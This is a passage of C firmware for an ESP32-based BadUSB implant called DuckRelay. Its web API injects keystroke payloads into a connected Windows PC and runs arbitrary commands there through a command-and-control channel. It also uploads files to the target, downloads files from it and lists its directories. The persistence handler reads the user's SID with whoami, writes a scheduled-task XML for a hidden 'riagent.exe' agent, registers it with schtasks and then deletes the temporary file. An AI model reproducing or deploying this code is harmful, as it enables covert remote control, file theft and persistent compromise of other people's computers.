            else if (c2 >= 'A' && c2 <= 'F') h2 = c2 - 'A' + 10;
            dst[di++] = (char)((h1 << 4) | h2);
            src += 3;
        } else if (*src == '+') {
            dst[di++] = ' ';
            src++;
        } else {
            dst[di++] = *src++;
        }
    }
    dst[di] = '\0';
}

/* ============================================================
 * Helper persistenza
 * ============================================================ */
static void trim_ws(char *s)
{
    size_t n = strlen(s);
    while (n > 0 && (s[n-1] == '\r' || s[n-1] == '\n' ||
                     s[n-1] == ' '  || s[n-1] == '\t')) {
        s[--n] = '\0';
    }
    char *p = s;
    while (*p == ' ' || *p == '\t') p++;
    if (p != s) memmove(s, p, strlen(p) + 1);
}

static bool parse_sid_from_whoami(const char *out, char *sid, size_t sid_max)
{
    /* Formato tipico: "DOMAIN\user","S-1-5-21-...-1001"
     * Cerchiamo esplicitamente la sequenza "," che separa i due campi
     * quotati, così siamo immuni a virgole dentro DOMAIN\user. */
    const char *sep = strstr(out, "\",\"");
    if (!sep) return false;

    const char *start = sep + 3;   /* salta `","` */
    const char *p = start;
    while (*p && *p != '"' && *p != '\r' && *p != '\n') p++;

    size_t len = (size_t)(p - start);
    if (len == 0 || len >= sid_max) return false;

    memcpy(sid, start, len);
    sid[len] = '\0';
    return true;
}

static bool append_str(char *out, size_t out_max, size_t *pos, const char *s)
{
    size_t n = strlen(s);
    if (*pos + n >= out_max) return false;
    memcpy(out + *pos, s, n);
    *pos += n;
    return true;
}

static bool append_xml_escaped(char *out, size_t out_max, size_t *pos, const char *s)
{
    for (; *s; s++) {
        const char *rep = NULL;
        switch (*s) {
        case '&':  rep = "&amp;";  break;
        case '<':  rep = "&lt;";   break;
        case '>':  rep = "&gt;";   break;
        case '"':  rep = "&quot;"; break;
        case '\'': rep = "&apos;"; break;
        default: break;
        }
        if (rep) {
            if (!append_str(out, out_max, pos, rep)) return false;
        } else {
            if (*pos + 1 >= out_max) return false;
            out[(*pos)++] = *s;
        }
    }
    return true;
}

static esp_err_t build_task_xml(const char *sid, const char *exe_path,
                                char *out, size_t out_max)
{
    size_t oi = 0;
    const char *p = TASK_XML_TEMPLATE;

    while (*p) {
        if (strncmp(p, "@SID@", 5) == 0) {
            if (!append_xml_escaped(out, out_max, &oi, sid))
                return ESP_ERR_INVALID_SIZE;
            p += 5;
        } else if (strncmp(p, "@EXE@", 5) == 0) {
            if (!append_xml_escaped(out, out_max, &oi, exe_path))
                return ESP_ERR_INVALID_SIZE;
            p += 5;
        } else {
            if (oi + 1 >= out_max) return ESP_ERR_INVALID_SIZE;
            out[oi++] = *p++;
        }
    }
    out[oi] = '\0';
    return ESP_OK;
}

/* Converte una stringa ASCII in buffer UTF-16LE con BOM.
 * Ritorna il buffer allocato (da liberare con free) e setta *out_len. */
static uint8_t *xml_to_utf16le(const char *ascii, size_t *out_len)
{
    size_t n = strlen(ascii);
    size_t total = 2 + n * 2;

    uint8_t *buf = malloc(total);
    if (!buf) return NULL;

    buf[0] = 0xFF;
    buf[1] = 0xFE;
    for (size_t i = 0; i < n; i++) {
        buf[2 + i * 2]     = (uint8_t)ascii[i];
        buf[2 + i * 2 + 1] = 0;
    }
    *out_len = total;
    return buf;
}

typedef struct {
    const uint8_t *data;
    size_t len;
    size_t pos;
} mem_read_ctx_t;

static size_t mem_read_cb(uint8_t *buf, size_t max_len, void *user_ctx)
{
    mem_read_ctx_t *ctx = (mem_read_ctx_t *)user_ctx;
    size_t remain = ctx->len - ctx->pos;
    if (remain == 0) return 0;

    size_t n = remain < max_len ? remain : max_len;
    memcpy(buf, ctx->data + ctx->pos, n);
    ctx->pos += n;
    return n;
}

/* ============================================================
 * GET /api/status
 * ============================================================ */
static esp_err_t status_get_handler(httpd_req_t *req)
{
    tinyusb_msc_mount_point_t mp = TINYUSB_MSC_STORAGE_MOUNT_APP;
    if (s_storage_hdl) {
        tinyusb_msc_get_storage_mount_point(s_storage_hdl, &mp);
    }

    bool fs_ok = false;
    long size = 0;
    if (mp == TINYUSB_MSC_STORAGE_MOUNT_APP) {
        FILE *f = fopen("/usb/deploy.txt", "r");
        if (f) {
            fs_ok = true;
            fseek(f, 0, SEEK_END);
            size = ftell(f);
            fclose(f);
        }
    }

	char buf[256];
	snprintf(buf, sizeof(buf),
			"{\"ok\":true,\"version\":\"" DUCKRELAY_VERSION "\","
			"\"usb_mounted\":%d,\"fs_ok\":%d,\"payload_size\":%ld,"
			"\"running\":%d,\"mount_target\":\"%s\"}",
			tud_mounted() ? 1 : 0, fs_ok ? 1 : 0, size,
			s_payload_running ? 1 : 0,
			mp == TINYUSB_MSC_STORAGE_MOUNT_USB ? "usb" : "app");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * POST /api/mount
 * ============================================================ */
static esp_err_t mount_post_handler(httpd_req_t *req)
{
    if (!s_storage_hdl) {
        return send_json_err(req, 500, "storage handle not initialized");
    }

    char buf[16] = {0};
    int r = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (r <= 0) {
        return send_json_err(req, 400, "missing body");
    }
    for (int i = 0; i < r; i++) {
        if (buf[i] == '\r' || buf[i] == '\n' || buf[i] == ' ') buf[i] = '\0';
    }

    tinyusb_msc_mount_point_t target;
    if (strcmp(buf, "app") == 0) {
        target = TINYUSB_MSC_STORAGE_MOUNT_APP;
    } else if (strcmp(buf, "usb") == 0) {
        target = TINYUSB_MSC_STORAGE_MOUNT_USB;
    } else {
        return send_json_err(req, 400, "invalid target (app|usb)");
    }

    esp_err_t err = tinyusb_msc_set_storage_mount_point(s_storage_hdl, target);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "set mount point failed: %s", esp_err_to_name(err));
        return send_json_err(req, 500, "failed to change mount point");
    }

    ESP_LOGI(TAG, "Mount point -> %s", buf);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * GET /api/payload
 * ============================================================ */
static esp_err_t payload_get_handler(httpd_req_t *req)
{
    FILE *f = fopen("/usb/deploy.txt", "r");
    if (!f) {
        return send_json_err(req, 404, "payload.txt not accessible (mounted on USB?)");
    }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz < 0 || sz > PAYLOAD_MAX_SIZE) {
        fclose(f);
        return send_json_err(req, 500, "payload too large or invalid");
    }

    char *buf = malloc((size_t)sz + 1);
    if (!buf) {
        fclose(f);
        return send_json_err(req, 500, "out of memory");
    }
    size_t n = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    buf[n] = '\0';

    httpd_resp_set_type(req, "text/plain; charset=utf-8");
    esp_err_t ret = httpd_resp_send(req, buf, (ssize_t)n);
    free(buf);
    return ret;
}

/* ============================================================
 * POST /api/payload
 * ============================================================ */
static esp_err_t payload_post_handler(httpd_req_t *req)
{
    size_t total = req->content_len;
    if (total > PAYLOAD_MAX_SIZE) {
        return send_json_err(req, 400, "payload too large");
    }

    char *buf = malloc(total + 1);
    if (!buf) return send_json_err(req, 500, "out of memory");

    size_t received = 0;
    while (received < total) {
        int r = httpd_req_recv(req, buf + received, total - received);
        if (r <= 0) {
            free(buf);
            return send_json_err(req, 500, "recv failed");
        }
        received += r;
    }
    buf[received] = '\0';

    FILE *f = fopen("/usb/deploy.txt", "w");
    if (!f) {
        free(buf);
        return send_json_err(req, 500, "cannot open payload.txt (mounted on USB?)");
    }
    size_t wr = fwrite(buf, 1, received, f);
    fclose(f);
    free(buf);

    if (wr != received) {
        return send_json_err(req, 500, "short write");
    }

    ESP_LOGI(TAG, "Payload saved: %u bytes", (unsigned)received);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true}", HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * POST /api/run
 * ============================================================ */
typedef struct {
    char *script;
} run_job_t;

static void run_task(void *arg)
{
    run_job_t *job = (run_job_t *)arg;
    payload_execute_string(job->script);
    free(job->script);
    free(job);
    s_payload_running = false;
    vTaskDelete(NULL);
}

static esp_err_t run_post_handler(httpd_req_t *req)
{
    if (s_payload_running) {
        return send_json_err(req, 409, "run already in progress");
    }
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    /* Parse ?layout=it|us (default IT) */
    bool layout_it = true;
    char query[64];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        char val[8] = {0};
        if (httpd_query_key_value(query, "layout", val, sizeof(val)) == ESP_OK) {
            if (strcmp(val, "us") == 0) layout_it = false;
            else if (strcmp(val, "it") == 0) layout_it = true;
            else return send_json_err(req, 400, "invalid layout (it|us)");
        }
    }

    char *script = NULL;
    size_t n = 0;

    if (req->content_len > 0) {
        /* Body non vuoto: esegui il body come script (non salvare) */
        if (req->content_len > PAYLOAD_MAX_SIZE) {
            return send_json_err(req, 400, "script too large");
        }
        script = malloc(req->content_len + 1);
        if (!script) return send_json_err(req, 500, "out of memory");
        size_t received = 0;
        while (received < req->content_len) {
            int r = httpd_req_recv(req, script + received,
                                   req->content_len - received);
            if (r <= 0) {
                free(script);
                return send_json_err(req, 500, "recv failed");
            }
            received += r;
        }
        script[received] = '\0';
        n = received;
    } else {
        /* Body vuoto: esegui deploy.txt */
        FILE *f = fopen("/usb/deploy.txt", "r");
        if (!f) {
            return send_json_err(req, 404, "deploy.txt not accessible (mounted on USB?)");
        }
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz <= 0 || sz > PAYLOAD_MAX_SIZE) {
            fclose(f);
            return send_json_err(req, 400, "payload empty or too large");
        }
        script = malloc((size_t)sz + 1);
        if (!script) { fclose(f); return send_json_err(req, 500, "out of memory"); }
        n = fread(script, 1, (size_t)sz, f);
        fclose(f);
        script[n] = '\0';
    }

    /* Imposta il layout PRIMA di avviare il task */
    payload_set_layout(layout_it);

    run_job_t *job = malloc(sizeof(*job));
    if (!job) { free(script); return send_json_err(req, 500, "out of memory"); }
    job->script = script;

    s_payload_running = true;
    if (xTaskCreate(run_task, "run", 4096, job, 5, NULL) != pdPASS) {
        s_payload_running = false;
        free(script); free(job);
        return send_json_err(req, 500, "cannot create task");
    }

    ESP_LOGI(TAG, "Run requested via web UI (%u bytes, layout=%s)",
             (unsigned)n, layout_it ? "IT" : "US");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"ok\":true,\"started\":true}", HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * POST /api/exec
 * ============================================================ */
static esp_err_t exec_post_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char cmd[512];
    int n = httpd_req_recv(req, cmd, sizeof(cmd) - 1);
    if (n <= 0) {
        return send_json_err(req, 400, "missing body");
    }
    cmd[n] = '\0';

    char *output = malloc(OUTPUT_MAX);
    if (!output) return send_json_err(req, 500, "out of memory");

    size_t out_len = 0;
    esp_err_t err = c2_execute_command(cmd, output, OUTPUT_MAX, &out_len);
    if (err != ESP_OK) {
        free(output);
        return send_json_err(req, 500, esp_err_to_name(err));
    }

    httpd_resp_set_type(req, "text/plain; charset=utf-8");
    esp_err_t ret = httpd_resp_send(req, output, (ssize_t)out_len);
    free(output);
    return ret;
}

/* ============================================================
 * Upload
 * ============================================================ */
static size_t upload_read_cb(uint8_t *buf, size_t max_len, void *user_ctx)
{
    httpd_req_t *req = (httpd_req_t *)user_ctx;
    int r = httpd_req_recv(req, (char *)buf, max_len);
    if (r == HTTPD_SOCK_ERR_TIMEOUT) {
        r = httpd_req_recv(req, (char *)buf, max_len);
    }
    if (r <= 0) return 0;
    return (size_t)r;
}

static esp_err_t upload_post_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[256];
    char path_enc[256];
    char path[256];

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK ||
        httpd_query_key_value(query, "path", path_enc, sizeof(path_enc)) != ESP_OK) {
        return send_json_err(req, 400, "missing path in query");
    }
    url_decode(path, path_enc, sizeof(path));

    if (strlen(path) == 0) {
        return send_json_err(req, 400, "empty path");
    }

    ESP_LOGI(TAG, "upload: path='%s' content_len=%u", path, (unsigned)req->content_len);

    size_t bytes_sent = 0;
    esp_err_t err = c2_upload_file(path, req->content_len,
                                    upload_read_cb, req,
                                    &bytes_sent);

    if (err != ESP_OK) {
        char buf[128];
        snprintf(buf, sizeof(buf), "{\"ok\":false,\"err\":\"upload failed\",\"bytes\":%u}",
                 (unsigned)bytes_sent);
        httpd_resp_set_status(req, "500 Internal Server Error");
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
    }

    char buf[128];
    snprintf(buf, sizeof(buf), "{\"ok\":true,\"bytes\":%u}", (unsigned)bytes_sent);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * Download
 * ============================================================ */
typedef struct {
    httpd_req_t *req;
    bool         headers_sent;
    char         filename[128];
} download_ctx_t;

static bool download_chunk_cb(const uint8_t *data, size_t len, void *user_ctx)
{
    download_ctx_t *ctx = (download_ctx_t *)user_ctx;

    if (!ctx->headers_sent) {
        httpd_resp_set_type(ctx->req, "application/octet-stream");
        char cd[200];
        snprintf(cd, sizeof(cd), "attachment; filename=\"%s\"", ctx->filename);
        httpd_resp_set_hdr(ctx->req, "Content-Disposition", cd);
        ctx->headers_sent = true;
    }

    esp_err_t r = httpd_resp_send_chunk(ctx->req, (const char *)data, len);
    if (r != ESP_OK) {
        ESP_LOGW(TAG, "download: send_chunk failed: %s", esp_err_to_name(r));
        return false;
    }
    return true;
}

static esp_err_t download_get_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[256];
    char path_enc[256];
    char path[256];

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK ||
        httpd_query_key_value(query, "path", path_enc, sizeof(path_enc)) != ESP_OK) {
        return send_json_err(req, 400, "missing path in query");
    }
    url_decode(path, path_enc, sizeof(path));

    if (strlen(path) == 0) {
        return send_json_err(req, 400, "empty path");
    }

    ESP_LOGI(TAG, "download: path='%s'", path);

    download_ctx_t ctx = {0};
    ctx.req = req;
    ctx.headers_sent = false;
    const char *base = strrchr(path, '\\');
    if (!base) base = strrchr(path, '/');
    base = base ? base + 1 : path;
    strncpy(ctx.filename, base, sizeof(ctx.filename) - 1);

    size_t total = 0;
    int rc = -1;
    esp_err_t err = c2_download_file(path, download_chunk_cb, &ctx, &total, &rc);

    if (err != ESP_OK || rc != 0) {
        ESP_LOGE(TAG, "download: failed err=%s rc=%d", esp_err_to_name(err), rc);
        if (!ctx.headers_sent) {
            return send_json_err(req, 500, "download failed (file not found?)");
        }
        return ESP_FAIL;
    }

    if (!ctx.headers_sent) {
        httpd_resp_set_type(req, "application/octet-stream");
        char cd[200];
        snprintf(cd, sizeof(cd), "attachment; filename=\"%s\"", ctx.filename);
        httpd_resp_set_hdr(req, "Content-Disposition", cd);
    }

    httpd_resp_send_chunk(req, NULL, 0);
    ESP_LOGI(TAG, "download: done %u bytes", (unsigned)total);
    return ESP_OK;
}

/* ============================================================
 * GET /api/ls
 *
 * Esegue due comandi dir separati (cartelle / file) per permettere
 * la navigazione dalla UI. Output JSON:
 *   {"ok":true,"dirs":[...],"files":[...]}
 *
 * Retrocompatibile: il campo "files" mantiene il vecchio formato.
 * ============================================================ */
static esp_err_t ls_get_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[300];
    char path_enc[256];
    char path[256];

    if (httpd_req_get_url_query_str(req, query, sizeof(query)) != ESP_OK ||
        httpd_query_key_value(query, "path", path_enc, sizeof(path_enc)) != ESP_OK) {
        return send_json_err(req, 400, "missing path in query");
    }
    url_decode(path, path_enc, sizeof(path));

    if (strlen(path) == 0) {
        return send_json_err(req, 400, "empty path");
    }
    if (strchr(path, '"')) {
        return send_json_err(req, 400, "invalid path");
    }

    /* Normalizza: rimuove backslash finali (tranne radice "C:\") */
    size_t plen = strlen(path);
    while (plen > 1 && (path[plen-1] == '\\' || path[plen-1] == '/')) {
        path[--plen] = '\0';
    }
	/* Se è "C:" (radice senza backslash), ripristina "C:\" */
	if (plen == 2 && path[1] == ':') {
		path[2] = '\\';
		path[3] = '\0';
	}	
    /* --- Comando 1: cartelle --- */
    char cmd_dirs[700];
    snprintf(cmd_dirs, sizeof(cmd_dirs),
        "if exist \"%s\" (dir /b /ad \"%s\") else (echo __NOTFOUND__)",
        path, path);

    char *out_dirs = malloc(OUTPUT_MAX);
    if (!out_dirs) return send_json_err(req, 500, "out of memory");

    size_t out_dirs_len = 0;
    esp_err_t err = c2_execute_command(cmd_dirs, out_dirs, OUTPUT_MAX, &out_dirs_len);
    if (err != ESP_OK) {
        free(out_dirs);
        return send_json_err(req, 500, esp_err_to_name(err));
    }

    if (strstr(out_dirs, "__NOTFOUND__")) {
        free(out_dirs);
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req,
            "{\"ok\":true,\"dirs\":[],\"files\":[],\"error\":\"folder not found\"}",
            HTTPD_RESP_USE_STRLEN);
    }

    /* --- Comando 2: file --- */
    char cmd_files[700];
    snprintf(cmd_files, sizeof(cmd_files),
        "if exist \"%s\" (dir /b /a-d \"%s\") else (echo __NOTFOUND__)",
        path, path);

    char *out_files = malloc(OUTPUT_MAX);
    if (!out_files) { free(out_dirs); return send_json_err(req, 500, "out of memory"); }

    size_t out_files_len = 0;
    err = c2_execute_command(cmd_files, out_files, OUTPUT_MAX, &out_files_len);
    if (err != ESP_OK) {
        free(out_dirs);
        free(out_files);
        return send_json_err(req, 500, esp_err_to_name(err));
    }

    ESP_LOGI(TAG, "ls: path='%s' dirs_len=%u files_len=%u",
             path, (unsigned)out_dirs_len, (unsigned)out_files_len);
	if (out_dirs_len > 0 && out_dirs_len < 300) {
		ESP_LOGI(TAG, "DIRS RAW: [%.*s]", (int)out_dirs_len, out_dirs);
	}
    /* Se anche il comando file dice NOTFOUND (non dovrebbe, ma per
     * robustezza), trattalo come cartella non trovata. */
    if (strstr(out_files, "__NOTFOUND__")) {
        free(out_dirs);
        free(out_files);
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req,
            "{\"ok\":true,\"dirs\":[],\"files\":[],\"error\":\"folder not found\"}",
            HTTPD_RESP_USE_STRLEN);
    }

    /* --- Costruisci JSON --- */
    size_t cap = (out_dirs_len + out_files_len) * 2 + 512;
    char *json = malloc(cap);
    if (!json) {
        free(out_dirs);
        free(out_files);
        return send_json_err(req, 500, "out of memory");
    }

    int wr = snprintf(json, cap, "{\"ok\":true,\"dirs\":[");
    if (wr < 0) {
        free(out_dirs); free(out_files); free(json);
        return send_json_err(req, 500, "json err");
    }
    size_t ji = (size_t)wr;

    int dir_count = 0;
    int file_count = 0;

    /* Helper inline: aggiunge tutte le righe di `src` come stringhe
     * JSON a `json`, saltando vuote e facendo escaping minimo.
     * Aggiorna *count. Ritorna false su overflow. */
    #define LS_ADD_LINES(src, count_ptr) do {                                   \
        const char *_p = (src);                                                 \
        while (*_p && ji + 8 < cap) {                                           \
            while (*_p == '\r' || *_p == '\n') _p++;                            \
            if (!*_p) break;                                                    \
            const char *_eol = _p;                                              \
            while (*_eol && *_eol != '\r' && *_eol != '\n') _eol++;             \
            size_t _len = (size_t)(_eol - _p);                                  \
            while (_len > 0 && (_p[_len-1] == ' ' || _p[_len-1] == '\t'))       \
                _len--;                                                         \
            if (_len > 0) {                                                     \
                if (*(count_ptr) > 0) json[ji++] = ',';                         \
                json[ji++] = '"';                                               \
                for (size_t _k = 0; _k < _len && ji + 6 < cap; _k++) {          \
                    unsigned char _c = (unsigned char)_p[_k];                   \
                    if (_c == '"')       { json[ji++] = '\\'; json[ji++] = '"'; } \
                    else if (_c == '\\') { json[ji++] = '\\'; json[ji++] = '\\'; } \
                    else if (_c < 0x20)  { /* skip */ }                         \
                    else                 { json[ji++] = (char)_c; }             \
                }                                                               \
                json[ji++] = '"';                                               \
                (*(count_ptr))++;                                               \
            }                                                                   \
            _p = _eol;                                                          \
        }                                                                       \
    } while (0)

    LS_ADD_LINES(out_dirs, &dir_count);

    json[ji++] = ']';
    json[ji++] = ',';
    memcpy(json + ji, "\"files\":[", 9);
    ji += 9;

    LS_ADD_LINES(out_files, &file_count);

    json[ji++] = ']';
    json[ji++] = '}';
    json[ji] = '\0';

    free(out_dirs);
    free(out_files);

    if (dir_count == 0 && file_count == 0) {
        free(json);
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req,
            "{\"ok\":true,\"dirs\":[],\"files\":[],\"error\":\"no files\"}",
            HTTPD_RESP_USE_STRLEN);
    }

    httpd_resp_set_type(req, "application/json");
    esp_err_t ret = httpd_resp_send(req, json, (ssize_t)ji);
    free(json);
    return ret;
    #undef LS_ADD_LINES
}

/* ============================================================
 * POST /api/persist/install
 * ============================================================ */
static esp_err_t persist_install_post_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char out[1024];
    size_t out_len = 0;
    esp_err_t err;

    /* 1) Risolvi %USERPROFILE% sul target */
    err = c2_execute_command("echo %USERPROFILE%", out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    trim_ws(out);
    if (out[0] == '\0') {
        return send_json_err(req, 500, "USERPROFILE not available");
    }
    char userprofile[256];
    strncpy(userprofile, out, sizeof(userprofile) - 1);
    userprofile[sizeof(userprofile) - 1] = '\0';

    char exe_path[320];
    snprintf(exe_path, sizeof(exe_path),
             "%s\\.riagent\\riagent.exe", userprofile);

    /* 2) Verifica preliminare esistenza agente */
    char cmd[640];
    snprintf(cmd, sizeof(cmd),
             "if exist \"%s\" (echo OK) else (echo MISSING)", exe_path);
    err = c2_execute_command(cmd, out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    if (!strstr(out, "OK")) {
        return send_json_err(req, 400,
            "agent file not found, re-run the BadUSB deploy");
    }

    /* 3) SID utente corrente */
    err = c2_execute_command("whoami /user /fo csv /nh",
                             out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    char sid[256];
    if (!parse_sid_from_whoami(out, sid, sizeof(sid))) {
        return send_json_err(req, 500, "unrecognized SID");
    }

    /* 4) Risolvi %TEMP% sul target */
    err = c2_execute_command("echo %TEMP%", out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    trim_ws(out);
    if (out[0] == '\0') {
        return send_json_err(req, 500, "TEMP not available");
    }
    char temp_dir[256];
    strncpy(temp_dir, out, sizeof(temp_dir) - 1);
    temp_dir[sizeof(temp_dir) - 1] = '\0';
    char task_path[320];
    snprintf(task_path, sizeof(task_path),
             "%s\\riagent_task.xml", temp_dir);

    /* 5) Genera XML */
    char xml_ascii[TASK_XML_MAX];
    err = build_task_xml(sid, exe_path, xml_ascii, sizeof(xml_ascii));
    if (err != ESP_OK) {
        return send_json_err(req, 500, "XML task too large");
    }

    /* 6) Converti in UTF-16LE + BOM */
    size_t utf16_len = 0;
    uint8_t *xml_utf16 = xml_to_utf16le(xml_ascii, &utf16_len);
    if (!xml_utf16) {
        return send_json_err(req, 500, "out of memory");
    }

    /* 7) Upload XML sul target */
    mem_read_ctx_t ctx = { .data = xml_utf16, .len = utf16_len, .pos = 0 };
    size_t sent = 0;
    err = c2_upload_file(task_path, utf16_len, mem_read_cb, &ctx, &sent);
    free(xml_utf16);

    if (err != ESP_OK || sent != utf16_len) {
        return send_json_err(req, 500, "XML task upload failed");
    }

    /* 8) Crea il task */
    snprintf(cmd, sizeof(cmd),
             "schtasks /create /tn \"Riagent\" /xml \"%s\" /f "
             ">nul 2>&1 && echo CREATED || echo FAILED",
             task_path);
    err = c2_execute_command(cmd, out, sizeof(out), &out_len);

    /* 9) Pulizia file temporaneo (best-effort) */
    char cleanup[384];
    snprintf(cleanup, sizeof(cleanup), "del \"%s\" >nul 2>&1", task_path);
    c2_execute_command(cleanup, NULL, 0, NULL);

    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    if (!strstr(out, "CREATED")) {
        return send_json_err(req, 500, "schtasks create failed");
    }

    /* 10) Verifica finale */
    snprintf(cmd, sizeof(cmd),
             "schtasks /query /tn \"Riagent\" "
             ">nul 2>&1 && echo INSTALLED || echo MISSING");
    err = c2_execute_command(cmd, out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    if (!strstr(out, "INSTALLED")) {
        return send_json_err(req, 500, "task verification failed");
    }

    ESP_LOGI(TAG, "persist install OK, sid=%s", sid);
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req,
        "{\"ok\":true,\"installed\":true}", HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * POST /api/persist/uninstall
 * ============================================================ */
static esp_err_t persist_uninstall_post_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char out[512];
    size_t out_len = 0;

    esp_err_t err = c2_execute_command(
        "schtasks /delete /tn \"Riagent\" /f >nul 2>&1",
        out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }

    const char *query_cmd =
        "schtasks /query /tn \"Riagent\" "
        ">nul 2>&1 && echo INSTALLED || echo MISSING";
    err = c2_execute_command(query_cmd, out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }
    if (strstr(out, "INSTALLED")) {
        return send_json_err(req, 500, "task removal failed");
    }

    ESP_LOGI(TAG, "persist uninstall OK");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req,
        "{\"ok\":true,\"installed\":false}", HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * GET /api/persist/status
 * ============================================================ */
static esp_err_t persist_status_get_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char out[512];
    size_t out_len = 0;

    const char *cmd =
        "schtasks /query /tn \"Riagent\" "
        ">nul 2>&1 && echo INSTALLED || echo MISSING";

    esp_err_t err = c2_execute_command(cmd, out, sizeof(out), &out_len);
    if (err != ESP_OK) {
        return send_json_err(req, 500, esp_err_to_name(err));
    }

    bool installed = strstr(out, "INSTALLED") != NULL;

    char buf[64];
    snprintf(buf, sizeof(buf),
             "{\"ok\":true,\"installed\":%s}",
             installed ? "true" : "false");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

/* ============================================================
 * URI table
 * ============================================================ */
static const httpd_uri_t s_uri_index = {
    .uri = "/", .method = HTTP_GET, .handler = index_get_handler, .user_ctx = NULL,
};

/* === STEP3-2: GET /api/scripts (lista o singolo) === */
static esp_err_t scripts_get_handler(httpd_req_t *req)
{
    if (!tud_mounted()) {
        return send_json_err(req, 400, "USB not mounted");
    }

    char query[128];
    char name_enc[64];

    /* Caso 1: ?name=NOME -> leggi singolo script */
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK &&
        httpd_query_key_value(query, "name", name_enc, sizeof(name_enc)) == ESP_OK) {

        char name[SCRIPT_NAME_MAX + 1];
        url_decode(name, name_enc, sizeof(name));

        char path[SCRIPT_PATH_MAX];
        if (!script_build_path(name, path, sizeof(path))) {
            return send_json_err(req, 400, "invalid name");
        }

        FILE *f = fopen(path, "r");
        if (!f) {
            return send_json_err(req, 404, "script not found");
        }
        fseek(f, 0, SEEK_END);
        long sz = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (sz < 0 || sz > PAYLOAD_MAX_SIZE) {
            fclose(f);
            return send_json_err(req, 500, "script too large");
        }
        char *buf = malloc((size_t)sz + 1);
        if (!buf) { fclose(f); return send_json_err(req, 500, "out of memory"); }
        size_t n = fread(buf, 1, (size_t)sz, f);
        fclose(f);
        buf[n] = '\0';

        httpd_resp_set_type(req, "text/plain; charset=utf-8");
        esp_err_t ret = httpd_resp_send(req, buf, (ssize_t)n);
        free(buf);
        return ret;
    }

    /* Caso 2: nessun ?name -> lista nomi */
    scripts_dir_ensure();

    DIR *d = opendir(SCRIPTS_DIR);
    if (!d) {
        httpd_resp_set_type(req, "application/json");
        return httpd_resp_send(req,
            "{\"ok\":true,\"scripts\":[]}", HTTPD_RESP_USE_STRLEN);
    }

    /* Buffer JSON: ~40 byte per nome, max 64 nomi (safe) */
    char *json = malloc(64 * 48 + 64);
    if (!json) { closedir(d); return send_json_err(req, 500, "out of memory"); }
    size_t ji = 0;
    int wr = snprintf(json, 64 * 48 + 64, "{\"ok\":true,\"scripts\":[");
    if (wr < 0) { free(json); closedir(d); return send_json_err(req, 500, "json err"); }
    ji = (size_t)wr;

    size_t ext_len = strlen(SCRIPT_EXT);
    int count = 0;

    struct dirent *e;
    while ((e = readdir(d)) != NULL) {
        size_t len = strlen(e->d_name);
        if (len <= ext_len) continue;
        if (strcmp(e->d_name + len - ext_len, SCRIPT_EXT) != 0) continue;

        /* strip extension */
        size_t name_len = len - ext_len;
        if (name_len > SCRIPT_NAME_MAX) continue;

        if (count > 0) json[ji++] = ',';
        json[ji++] = '"';
        for (size_t k = 0; k < name_len; k++) {
            char c = e->d_name[k];
            if (c == '"' || c == '\\') {
                json[ji++] = '\\';
            }
